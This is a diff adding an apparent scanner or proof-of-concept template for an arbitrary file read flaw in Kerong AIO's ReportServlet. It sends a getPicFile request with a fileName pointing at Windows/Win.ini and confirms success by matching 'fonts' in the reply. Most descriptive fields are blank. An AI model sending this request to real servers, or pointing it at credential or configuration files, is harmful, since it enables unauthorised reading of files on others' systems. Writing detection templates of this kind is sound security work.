@@ -1,0 +1,18 @@
+id:
+
+info:
+  name: 科荣AIO ReportServlet 任意文件读取漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /ReportServlet?operation=getPicFile&fileName=/DISKC/Windows/Win.ini
+  headers:
+response1:
+  headers:
+  body: fonts
+  code: 200
+requests2:
+response2:
